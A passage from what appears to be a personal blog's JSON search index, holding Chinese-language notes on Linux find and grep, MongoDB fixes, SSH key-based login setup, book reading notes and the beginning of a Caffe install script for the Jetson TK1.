target=\"_blank\" rel=\"noopener\">blob</a></li>\n<li><a href=\"https://developer.mozilla.org/en-US/docs/Web/API/FileReader/readAsDataURL\" target=\"_blank\" rel=\"noopener\">readAsDataURL</a></li>\n<li><a href=\"https://developer.mozilla.org/zh-CN/docs/Web/API/URL/createObjectURL\" target=\"_blank\" rel=\"noopener\">createObjectURL</a></li>\n<li><a href=\"https://developer.mozilla.org/zh-CN/docs/Web/API/HTMLCanvasElement/toDataURL\" target=\"_blank\" rel=\"noopener\">HTMLCanvasElementtoDataURL</a></li>\n</ul>\n","categories":["全栈工程师"],"tags":["学习笔记"]},{"title":"不算问题的问题","url":"http://iami.xyz/2016/09/20/Little-Problem-solved/","content":"<h4 id=\"Enviroment-Configure\"><a href=\"#Enviroment-Configure\" class=\"headerlink\" title=\"Enviroment Configure\"></a>Enviroment Configure</h4><ul>\n<li>add-apt-repository: command not found:</li>\n</ul>\n<blockquote>\n<p><code>sudo apt-get install software-properties-common</code></p>\n</blockquote>\n<ul>\n<li>JAVA_HOME</li>\n</ul>\n<blockquote>\n<p><code>export JAVA_HOME=$(readlink -f /usr/bin/java | sed &quot;s:bin/java::&quot;)</code></p>\n</blockquote>\n<ul>\n<li>ShadowSocks</li>\n</ul>\n<blockquote>\n<p>创建或修改默认config.json,只需要增加”port”:”pwd”，即可完成多用户配置，当然还有多用户管理系统:<br><a href=\"https://github.com/wzxjohn/moeSS\" target=\"_blank\" rel=\"noopener\">Moess</a>, <a href=\"https://github.com/orvice/ss-panel\" target=\"_blank\" rel=\"noopener\">ss-panel</a><br>然后ssserver -c config/file/to/your/path,也许你还需要nohup屏蔽阻断信号，或者加入开机启动, rc.local</p>\n</blockquote>\n<ul>\n<li>IRC密码忘了</li>\n</ul>\n<blockquote>\n</blockquote>\n<pre><code>/msg nickserv help sendpass       查看怎么找回密码\n/msg NickServ SENDPASS Nickname      找回密码，然后你的邮箱就会收到重置的一个条件密码            \n/msg NickServ SETPASS mour &lt;关联邮箱的条件码&gt; &lt;你的新密码&gt;\n/msg NickServ identify yourpassword       密码登入服务器\n</code></pre><ul>\n<li>IRC里面有人问个问题，我是用awk来做的，但是后来那人说要判断每次划分后的前缀。最后有人用下面方式这种先做出来了</li>\n</ul>\n<blockquote>\n<pre><code class=\"bash\"><span class=\"built_in\">echo</span> -e <span class=\"string\">'/abc:def:g\\nhi:/jk:l'</span> | <span class=\"keyword\">while</span> IFS=: <span class=\"built_in\">read</span> -a parts; \n                    <span class=\"keyword\">do</span> \n                        <span class=\"keyword\">for</span> part <span class=\"keyword\">in</span> <span class=\"string\">\"<span class=\"variable\">${parts[@]}</span>\"</span>; \n                            <span class=\"keyword\">do</span>\n                                [[ <span class=\"variable\">$part</span> = /* ]] &amp;&amp; <span class=\"built_in\">echo</span> <span class=\"string\">\"<span class=\"variable\">$part</span>\"</span>; \n                            <span class=\"keyword\">done</span>;\n                    <span class=\"keyword\">done</span>\n</code></pre>\n<p>当时用了cat filename | awk -F ‘/‘ ‘{}’ 被人建议读读下面的资源，意思就是使用 &lt; 代替使用　cat 得到，以及不要用kill -9 之类的提议，以及一些理由。<br>不过对于一些初学者，我只能说，可以暂时不要这么考虑。</p>\n</blockquote>\n<h4 id=\"Other\"><a href=\"#Other\" class=\"headerlink\" title=\"Other\"></a>Other</h4><ol>\n<li>nutch 释放了新的版本</li>\n<li>h5ai　html5的文件下载管理</li>\n</ol>\n<h4 id=\"Resources\"><a href=\"#Resources\" class=\"headerlink\" title=\"Resources\"></a>Resources</h4><ul>\n<li><a href=\"http://porkmail.org/era/unix/award.html\" target=\"_blank\" rel=\"noopener\">Something About Linux</a></li>\n</ul>\n","categories":["全栈工程师"],"tags":["学习笔记"]},{"title":"find and grep","url":"http://iami.xyz/2016/09/10/find-Useage/","content":"<h3 id=\"讲讲find，还有grep\"><a href=\"#讲讲find，还有grep\" class=\"headerlink\" title=\"讲讲find，还有grep\"></a>讲讲find，还有grep</h3><p>之前在stackoverflow看了<a href=\"http://stackoverflow.com/questions/16956810/how-to-find-all-files-containing-specific-text-on-linux\" target=\"_blank\" rel=\"noopener\">How to find all files containing specific text on Linux?</a></p>\n<h4 id=\"find的基本格式\"><a href=\"#find的基本格式\" class=\"headerlink\" title=\"find的基本格式\"></a>find的基本格式</h4><ul>\n<li><code>find [path] [options] [tests] [actions]</code></li>\n</ul>\n<p>选项简介</p>\n<ul>\n<li><a href=\"#→.0\">path</a> :没啥可说的，路径大家可以试试<code>find $pwd</code>和<code>find $PWD</code></li>\n<li><a href=\"#1.1\">options</a></li>\n<li><a href=\"#2.2\">tests</a></li>\n<li><a href=\"#-.-\">actions</a><strong><strong>___</strong></strong>点我URL会卖萌</li>\n</ul>\n<p></p><h3 id=\"1.1\">options</h3><p></p>\n<ul>\n<li>-mount    #不要搜索其他挂载系统</li>\n<li>-name        查找什么</li>\n<li>-iname</li>\n</ul>\n<blockquote>\n<p><code>$  find / -mount -name test print</code></p>\n</blockquote>\n<p></p><h3 id=\"2.2\">tests</h3><p></p>\n<ul>\n<li>newer otherfile  #比哪个文件新</li>\n<li>type f            #是文件</li>\n<li>type d            #是文件夹</li>\n</ul>\n<p></p><h3 id=\"-.-\">actions</h3><p></p>\n<ul>\n<li>-exec command</li>\n<li>-ok command</li>\n</ul>\n<blockquote>\n<p>图画的有点丑，哈哈</p>\n</blockquote>\n<ul>\n<li>-exec ls -l {} \\;<br><img src=\"/images//find-options.png\" alt=\"img\"></li>\n</ul>\n<font color=\"red\"> 有用的例子</font>\n\n<p>这个例子就是讲如何在当前文件夹下找出包含某个字符的文本。当然这是说明你知道这个字符在这个文件夹下。反过来我出个小问题，假如你想找出包含某个字符的文本，你不知道这个文本在哪，但你知道他包含什么。你知道这个文件里大概有个什么样的字符，你需要查找到他，该怎么办？</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ find / -<span class=\"built_in\">type</span> f -<span class=\"built_in\">exec</span> grep -H <span class=\"string\">'text-to-find-here'</span> &#123;&#125; \\;</span><br><span class=\"line\">$ grep -rnw <span class=\"string\">'/path/to/somewhere/'</span> -e <span class=\"string\">\"pattern\"</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"/images//grep.png\" alt=\"img\"></p>\n<p>还有w是word-regexp,l是show filename not the result itself, grep其实没怎么讲，因为我都是常用的也就是-iroEn几个选项，其他的很少用，剩下的配合awk了</p>\n<blockquote>\n<p>解密就是需要配合-l选项就行了，当时我是不知道shadowsocks在搬瓦工的位置在哪，但我知道配置文件的格式，显而易见。So easy.</p>\n</blockquote>\n<h3 id=\"最后，看看ls和phantomjs里面的列文件比较\"><a href=\"#最后，看看ls和phantomjs里面的列文件比较\" class=\"headerlink\" title=\"最后，看看ls和phantomjs里面的列文件比较\"></a>最后，看看ls和phantomjs里面的列文件比较</h3><p>这个列文件比ls快了不少，刚才去找之前的测试记录，但是竟然没了。<br>当然既然测试数据找不到了，那就说明这个不具有说服性。暂且列出，放于此处。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// List all the files in a Tree of Directories</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">\"use strict\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">var</span> system = <span class=\"built_in\">require</span>(<span class=\"string\">'system'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (system.args.length !== <span class=\"number\">2</span>) &#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"Usage: phantomjs scandir.js DIRECTORY_TO_SCAN\"</span>);</span><br><span class=\"line\">    phantom.exit(<span class=\"number\">1</span>);                    <span class=\"comment\">//exit status mean 1 is wrong</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> scanDirectory = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">path</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> fs = <span class=\"built_in\">require</span>(<span class=\"string\">'fs'</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (fs.exists(path) &amp;&amp; fs.isFile(path)) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(path);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (fs.isDirectory(path)) &#123;</span><br><span class=\"line\">        fs.list(path).forEach(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">e</span>) </span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> ( e !== <span class=\"string\">\".\"</span> &amp;&amp; e !== <span class=\"string\">\"..\"</span> ) &#123;    <span class=\"comment\">//&lt; Avoid loops</span></span><br><span class=\"line\">                scanDirectory(path + <span class=\"string\">'/'</span> + e);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">scanDirectory(system.args[<span class=\"number\">1</span>]);</span><br><span class=\"line\">phantom.exit();</span><br></pre></td></tr></table></figure>\n<h2 id=\"Resources\"><a href=\"#Resources\" class=\"headerlink\" title=\"Resources\"></a>Resources</h2><ul>\n<li><a href=\"https://help.ubuntu.com/community/find\" target=\"_blank\" rel=\"noopener\">find (Commuinty Help Wiki)</a></li>\n<li><a href=\"https://github.com/ariya/phantomjs/blob/master/examples/scandir.js\" target=\"_blank\" rel=\"noopener\">pantomjs scandir.js</a></li>\n</ul>\n","categories":["全栈工程师"],"tags":["知识回顾"]},{"title":"《全栈工程师的自我修养阅读笔记》","url":"http://iami.xyz/2016/09/04/web-full-stack-think/","content":"<h3 id=\"《全栈工程师的自我修养阅读笔记》\"><a href=\"#《全栈工程师的自我修养阅读笔记》\" class=\"headerlink\" title=\"《全栈工程师的自我修养阅读笔记》\"></a>《全栈工程师的自我修养阅读笔记》</h3><p>上上周花了一个周日，把雨果写的那个《web全栈工程师的自我修养》给看了一遍。翻了翻书上的笔记，把他整理一下，如下：</p>\n<h3 id=\"学到的东西\"><a href=\"#学到的东西\" class=\"headerlink\" title=\"学到的东西\"></a><font color=\"red\">学到的东西</font></h3><font color=\"green\"><br><br><em> 专业维度这一说法。有的产品可能是整个团队维护一个产品，成员来自不同的岗位。也有可能是一个组全是某个类型的工程师，维护不同的产品。\n</em> 记得维护自己的作品集，一定要有这个意识，重视自己的作品集。<br><em> 积累声望和保持心态(这个完全靠自己，修身养性亦为如此。君子一言，驷马难追)\n</em> 框架是比库更广泛的概念，一个框架只是一个软件系统中可重用的一部分，可能包含子程序，库，胶水语言，图片等资源。<br><em> 向移动端转型\n</em> 让市场认可你的能力，而非老板。<br><em> 持续集成，对于可能损坏主干原则的代码，不要提交到主干，而是先创建一个分支。\n</em> 设计模式分为三大类：创建型模式，结构型模式，行为模式。<br><em> 时间管理的四象限：重要与否X紧急与否，进行交叉组合\n</em> 设计基础：重复，对比，对齐，亲密性。基础又容易掌握<br><em> 学一点沟通与管理\n</em> 考虑到你的在线简历，面试管可能没网的情况，手绘稿。<br><br></font>\n\n<h3 id=\"其他\"><a href=\"#其他\" class=\"headerlink\" title=\" 其他 \"></a><font color=\"red\"> 其他 </font></h3><h4 id=\"1-问题\"><a href=\"#1-问题\" class=\"headerlink\" title=\"1.问题\"></a>1.问题</h4><blockquote>\n<ul>\n<li>数据库的设计原则</li>\n<li>如何提高自己的设计水平</li>\n<li>多技能和细分的技能，一精多能</li>\n<li>大公司小公司的选择(当你问别人时，你就输了)</li>\n<li>如何自动化的方式生成新的文件名并修改html中的引用(gulp,grunt之类的)</li>\n<li>有合适的分离粒度，什么是合适的?</li>\n<li>设计模式还有些不太懂</li>\n</ul>\n</blockquote>\n<h4 id=\"2-书中提到的一些资源\"><a href=\"#2-书中提到的一些资源\" class=\"headerlink\" title=\"2.书中提到的一些资源\"></a>2.书中提到的一些资源</h4><blockquote>\n<ul>\n<li><a href=\"https://www.smashingmagazine.com/\" target=\"_blank\" rel=\"noopener\">Smashing Magazine</a></li>\n<li><a href=\"https://www.tuts.com/\" target=\"_blank\" rel=\"noopener\">tuts</a></li>\n<li><a href=\"https://dribbble.com/\" target=\"_blank\" rel=\"noopener\">Dribbble</a></li>\n</ul>\n</blockquote>\n<h4 id=\"3-所列未看又值得一看的书单\"><a href=\"#3-所列未看又值得一看的书单\" class=\"headerlink\" title=\"3.所列未看又值得一看的书单\"></a>3.所列未看又值得一看的书单</h4><blockquote>\n<ul>\n<li>《专业主义》</li>\n<li>《设计模式》</li>\n<li>《精通CSS高级Web标准解决方案》</li>\n<li>《From Zero to One》</li>\n<li>《精益创业》</li>\n<li>《代码整洁之道》</li>\n<li>《网站性能监测与优化》</li>\n<li>《精通CSS：高级Web标准方案》</li>\n<li>《代码大全2》</li>\n<li>《写给大家看的设计书》</li>\n</ul>\n<p>有几本书读了，然后以为列的很多都读过。然后发现余果书中所列还是有很多本书没看过啊。。。<br>有书不至于太寂寞，有书怎么会无聊呢。</p>\n</blockquote>\n<h4 id=\"4-评价\"><a href=\"#4-评价\" class=\"headerlink\" title=\"4.评价\"></a>4.评价</h4><blockquote>\n<ul>\n<li><p>文中提到的让设计师了解网页制作的知识，让程序员了解设计的知识。 也能想到，但是不知道真正实行起来怎么样啊。</p>\n</li>\n<li><p>设计模式这一块不知道是有点深了还是有点空了。用户友好性不太理想。</p>\n</li>\n<li><p>关于Makefile组织工程结构这一块讲的不好，完全是滥竽充数，即便以我写过Makefile的来说，一开始都没有明白在Web工程中如何组织代码结构。还好看了nodeclub的源码中Makefile，才突然明白了。一则说明我的Makefile理解的不够深，二则说明了这一篇写的不好。不过也有收获了。</p>\n</li>\n<li><p>书中有个道理讲的我比较喜欢，很生动。余果问他朋友怎么学IOS开发，他朋友说：“有一台MAC就行了”。这样我想起那个知乎上别人问考研怎么考，有个人说：“考得起就考”。所谓悟得到便悟了。就是这个意思。说，你就输了。</p>\n</li>\n</ul>\n</blockquote>\n","categories":["全栈工程师"],"tags":["实习笔记"]},{"title":"几个mongo的小问题","url":"http://iami.xyz/2016/08/31/mongo-problem-solved/","content":"<h2 id=\"几个mongo的小问题\"><a href=\"#几个mongo的小问题\" class=\"headerlink\" title=\"几个mongo的小问题\"></a>几个mongo的小问题</h2><h4 id=\"别人问的问题，还有自己遇到的问题。\"><a href=\"#别人问的问题，还有自己遇到的问题。\" class=\"headerlink\" title=\"别人问的问题，还有自己遇到的问题。\"></a>别人问的问题，还有自己遇到的问题。</h4><h4 id=\"1-mongo-bacthsize的问题-Assertion-10334\"><a href=\"#1-mongo-bacthsize的问题-Assertion-10334\" class=\"headerlink\" title=\"1.mongo bacthsize的问题(Assertion: 10334):\"></a>1.mongo bacthsize的问题(Assertion: 10334):</h4><blockquote>\n<p><code>mongorestore -d my-database --batchSize=100 ./database-dump-directory</code></p>\n<blockquote>\n<p>这个会使速度变慢，但是能解决，因为最开始我提出是<code>mongd --repair --dbpath=&quot;dbpath&quot;</code>或者<code>db.runCommand({repairDatabase:1})</code>,然后再重新导出来，但是很不幸，不行。</p>\n</blockquote>\n</blockquote>\n<h4 id=\"2-聚类查找，统计每月新增用户量\"><a href=\"#2-聚类查找，统计每月新增用户量\" class=\"headerlink\" title=\"2.聚类查找，统计每月新增用户量:\"></a>2.聚类查找，统计每月新增用户量:</h4><blockquote>\n<p><code>db.accounts.aggregate({$project:{month : {$month:&quot;$createdAt&quot;}}})</code> </p>\n<blockquote>\n<p>注： 你的$month对应的应该是你自己的用户注册时间。同样如果把$month替换成$year,$day，可以统计出当天或当年的。</p>\n</blockquote>\n</blockquote>\n<h4 id=\"3-导入BSON格式\"><a href=\"#3-导入BSON格式\" class=\"headerlink\" title=\"3.导入BSON格式\"></a>3.导入BSON格式</h4><blockquote>\n<p><code>mongorestore -d db_name -c collection_name path/file.bson</code></p>\n<p><code>mongorestore --drop -d db_name -c collection_name path/file.bson</code></p>\n</blockquote>\n<h4 id=\"4-有人的mongo不能更换默认数据库\"><a href=\"#4-有人的mongo不能更换默认数据库\" class=\"headerlink\" title=\"4. 有人的mongo不能更换默认数据库:\"></a>4. 有人的mongo不能更换默认数据库:</h4><blockquote>\n<p>最后发现是权限的问题,因为他采用的方法又新建了一个mongo用户，所以导致权限问题，不能更改配置文件的默认数据库。</p>\n</blockquote>\n<h4 id=\"5-Windows下启动Mongo\"><a href=\"#5-Windows下启动Mongo\" class=\"headerlink\" title=\"5. Windows下启动Mongo\"></a>5. Windows下启动Mongo</h4><blockquote>\n<p>虽然我把mongo的bin目录加了环境变量，但是每次还是要cd到特定目录，比较烦。于是建一个xx.cmd文件。经测试发现不能把该文件放在中文名称目录下，否则会报错。无法启动。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">E:</span><br><span class=\"line\"><span class=\"built_in\">cd</span> Mongodb</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"Now You In E:\\Mongodb\"</span></span><br><span class=\"line\">start .\\bin\\mongod.exe --config .\\data\\mongo.config</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"You mongo server is running\"</span></span><br></pre></td></tr></table></figure>\n</blockquote>\n<h4 id=\"6-删除小与特定日期的记录\"><a href=\"#6-删除小与特定日期的记录\" class=\"headerlink\" title=\"6.删除小与特定日期的记录\"></a>6.删除小与特定日期的记录</h4><blockquote>\n<p><code>db.logTemplate.remove({&quot;operationTime&quot;:{$lt:ISODate(&quot;2016-07-01T16:00:00Z&quot;)}})</code></p>\n</blockquote>\n<h4 id=\"7-find与findone的区别\"><a href=\"#7-find与findone的区别\" class=\"headerlink\" title=\"7.find与findone的区别\"></a>7.find与findone的区别</h4><blockquote>\n<ul>\n<li>findOne()只返回一个文档对象</li>\n<li>find()返回一个集合列表， 如果不指定过滤范围，它将返回整个集合，客户端中最多只显示前20个文档。</li>\n</ul>\n</blockquote>\n","categories":["全栈工程师"],"tags":["学习笔记","数据存储"]},{"title":"SSH的免密码登陆","url":"http://iami.xyz/2016/08/28/ssh-remote-free/","content":"<h2 id=\"SSH-相关\"><a href=\"#SSH-相关\" class=\"headerlink\" title=\" SSH 相关  \"></a><font color=\"green\"> SSH 相关  </font></h2><h3 id=\"SSH-Introduction\"><a href=\"#SSH-Introduction\" class=\"headerlink\" title=\"SSH Introduction\"></a>SSH Introduction</h3><blockquote>\n<p>SSH协议中主要为三个部分：</p>\n<blockquote>\n<ol>\n<li>传输层</li>\n</ol>\n<ul>\n<li>用户认证协议</li>\n<li>连接协议</li>\n</ul>\n</blockquote>\n<p> 验证主要为两种安全验证</p>\n<blockquote>\n<ol>\n<li>基于密码的安全验证(顾名思义，知道账户名和密码进行登录)<ul>\n<li>基于密钥的安全验证(通过验证密钥进行登录)</li>\n</ul>\n</li>\n</ol>\n</blockquote>\n<p>OpenSSH是提供ssh相关服务的经典工具</p>\n<blockquote>\n<ul>\n<li>远程操作 ssh, scp, and sftp.</li>\n<li>密钥管理  ssh-add, ssh-keysign, ssh-keyscan,  ssh-keygen.</li>\n<li>服务端 sshd, sftp-server,  ssh-agent.</li>\n</ul>\n</blockquote>\n</blockquote>\n<h3 id=\"SSH-Basic-Useage\"><a href=\"#SSH-Basic-Useage\" class=\"headerlink\" title=\"SSH Basic Useage\"></a>SSH Basic Useage</h3><ul>\n<li><code>$ ssh remotehost</code></li>\n<li><code>$ ssh username@remotehost</code></li>\n<li><code>$ ssh username@remotehost -p 23456</code></li>\n<li><code>$ ssh -p 23456 username@remotehost</code></li>\n</ul>\n<h3 id=\"How-to-install-SSH\"><a href=\"#How-to-install-SSH\" class=\"headerlink\" title=\"How to install SSH\"></a>How to install SSH</h3><blockquote>\n<p>ubuntu</p>\n<blockquote>\n<p>   <code>$ sudo apt-get install openssh-server</code> # ssh服务</p>\n<p>   <code>$ service ssh start</code>  #一般安装之后，服务就自动开启了，如果没有的话可以手动开启下。</p>\n</blockquote>\n<p>windows</p>\n<blockquote>\n<p>ssh服务可以安装cygwin,具体参考下相关资源里的openssh-rsa-authentication-for-windows-and-linux，客户端的话可以安装Xshell, putty,MobaXterm.</p>\n</blockquote>\n<p>android</p>\n<blockquote>\n<p>ssh服务用SSHDroid，客户端用connect-ssh,Juice-ssh,super terminal去连接远程服务器。</p>\n<h3 id=\"传输数据-基本上是单个文件传输\"><a href=\"#传输数据-基本上是单个文件传输\" class=\"headerlink\" title=\"传输数据(基本上是单个文件传输)\"></a>传输数据(基本上是单个文件传输)</h3><ul>\n<li><code>$　scp user@destip:/path/to/your/dest</code></li>\n<li><code>$　scp -P yourPort user@destip:/path/ /local/path/</code></li>\n<li><code>$　scp -P yourPort sourceip:/path/ user@destip:/path/</code></li>\n</ul>\n</blockquote>\n<p>其他</p>\n<blockquote>\n<ul>\n<li><font color=\"red\">rsync(服务器之间同步数据，极好的，适用于文件夹之类的都可以,apt-get install rsync(ubuntu) yum install rsync(Centos),当然这些服务器之间的备份最好配合crontab定时使用),</font></li>\n<li>sz(windwos下xshell配合sz极好的，这个要源码安装，google下就行了)</li>\n</ul>\n</blockquote>\n</blockquote>\n<h3 id=\"免密码登录远程服务器\"><a href=\"#免密码登录远程服务器\" class=\"headerlink\" title=\"免密码登录远程服务器\"></a>免密码登录远程服务器</h3><blockquote>\n<p>就是你把你的公钥放到远程服务器上。登录的时候，服务器会向用户发送一段随机字符串，用户用自己的私钥加密后，再发回来。服务器用事先储存的公钥进行解密，如果成功，就允许登录shell。记得之前看过一个案例，有一个把私钥放到了服务器，被人家攻克之后，盗了密钥又把其他服务器给干了。</p>\n<p>&gt;</p>\n<ul>\n<li><code>$ ssh-keygen</code></li>\n<li><code>$ ssh-copy-id -i ~/.ssh/id_rsa.pub remoteip</code></li>\n<li><code>$ service ssh restart</code></li>\n<li><code>$ chmod 700 ~/.ssh</code></li>\n<li><code>$ chmod 600 ~/.ssh/authorized_keys</code></li>\n<li><code>$ ssh user@host &#39;mkdir -p .ssh &amp;&amp; cat &gt;&gt; .ssh/authorized_keys&#39; &lt; ~/.ssh/id_rsa.pub</code></li>\n</ul>\n<font color=\"red\">不知道大家有没有发现权限设置有个很好玩的东西，就是父目录假如是只有roto可访问，但你给下面的子目录设置成了777之类的，那么只可以直接访问者个字目录下的东西，是不是又想到了什么邪恶的东西，哈哈</font>\n\n</blockquote>\n<h3 id=\"不相关的周末\"><a href=\"#不相关的周末\" class=\"headerlink\" title=\"不相关的周末\"></a>不相关的周末</h3><p>以前想写个ssh防爆破脚本，当时是想grep下log,然后触发相应的iptables规则，后来发现了防爆破工具fail2ban，原理应该也差不多。<br>突然看到很多少在网上说markdown转pdf怎么转，什么什么收费软件怎么怎么样，卧槽，难道不能chrom上ctrl+p打印吗？？</p>\n<p>扎着冰糖杨梅，边吃边写markdown，想起来的都写一写。查着写着，吐槽着。昨天的书展真是不咋滴啊。还有前天被一巴基斯坦王八蛋放了鸽子，艹，明明9pm跑步，没见到人。艹艹。<br>还有别忘了，不如用mosh</p>\n<h4 id=\"相关资源\"><a href=\"#相关资源\" class=\"headerlink\" title=\"相关资源\"></a>相关资源</h4><ul>\n<li><a href=\"https://zh.wikipedia.org/wiki/Secure_Shell\" target=\"_blank\" rel=\"noopener\">SSH 维基百科</a></li>\n<li><a href=\"http://www.openssh.org/\" target=\"_blank\" rel=\"noopener\">OpenSSH</a> </li>\n<li><a href=\"http://cects.com/openssh-rsa-authentication-for-windows-and-linux/\" target=\"_blank\" rel=\"noopener\">openssh-rsa-authentication-for-windows-and-linux</a></li>\n<li><a href=\"https://rsync.samba.org/examples.html\" target=\"_blank\" rel=\"noopener\">rsync example</a></li>\n<li><a href=\"http://www.cnblogs.com/peida/archive/2013/01/08/2850483.html\" target=\"_blank\" rel=\"noopener\">corntab</a></li>\n</ul>\n","categories":["全栈工程师"],"tags":["知识回顾"]},{"title":"How to Install Caffe in Jeston TK1","url":"http://iami.xyz/2016/08/28/cafeeinstall/","content":"<h1 id=\"Jeston-TK1-Install-Caffe\"><a href=\"#Jeston-TK1-Install-Caffe\" class=\"headerlink\" title=\"Jeston TK1 Install Caffe\"></a>Jeston TK1 Install Caffe</h1><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/bash</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#以下安装为在jeston TK1(安装的是ubuntu 14.04LTS)上所完成，无意外当适用于普通linux系统.但是在选择cudnn时务必选择自己系统对应的版本。</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#安装git</span></span><br><span class=\"line\">sudo add-apt-repository universe</span><br><span class=\"line\">sudo apt-get update</span><br><span class=\"line\">sudo pat-get install git </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#需要安装opencv ,参考官网</span></span><br><span class=\"line\">sudo apt-get install build-essential</span><br><span class=\"line\">sudo apt-get install cmake git libgtk2.0-dev pkg-config libavcodec-dev libavformat-dev libswscale-dev</span><br><span class=\"line\">sudo apt-get install python-dev python-numpy libtbb2 libtbb-dev libjpeg-dev libpng-dev libtiff-dev libjasper-dev libdc1394-22-dev</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">cd</span> ~</span><br><span class=\"line\">git <span class=\"built_in\">clone</span> https://github.com/opencv/opencv.git</span><br><span class=\"line\">mkdir build </span><br><span class=\"line\"><span class=\"built_in\">cd</span> build</span><br><span class=\"line\">cmake ..</span><br><span class=\"line\">make</span><br><span class=\"line\">sudo make install</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#安装依赖</span></span><br><span class=\"line\">sudo apt-get install -y gcc-4.7 g++-4.7</span><br><span class=\"line\">sudo apt-get install libprotobuf-dev libleveldb-dev libsnappy-dev libopencv-dev libboost-all-dev libhdf5-serial-dev libgflags-dev libgoogle-glog-dev liblmdb-dev protobuf-compiler libatlas-base-dev</span><br><span class=\"line\">sudo apt-get install python-dev python-pip python-numpy gfortran</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#如果出现cv:imagecode undefined ， 请 尝试 sudo ldconfig ，或者在makefile里面直接把libopencvXXX的库连接上去。</span></span><br><span class=\"line\"><span class=\"comment\">#如果是opencv3，你需要在makefile.config里面讲opencv3选项选中。</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#if you need cudnn, you should download cudnn lib and unzip it to cuda path。 注意cudnn的版本，即便是cuda-6.5也需要cudnn version &gt;3 这个需要去nvdia官网注册，然后才能下载。</span></span><br><span class=\"line\"><span class=\"comment\">#sudo cp cudnn.h /usr/local/cuda/include</span></span><br><span class=\"line\"><span class=\"comment\">#sudo cp libcudnn* /usr/local/cuda/lib</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#安装caffe </span></span><br><span class=\"line\"><span class=\"built_in\">cd</span> ~</span><br><span class=\"line\">git <span class=\"built_in\">clone</span> https://github.com/BVLC/caffe.git</span><br><span class=\"line\"><span class=\"built_in\">cd</span> caffe</span><br><span class=\"line\">cp Makefile.config.example Makefile.config</span><br><span class=\"line\"><span 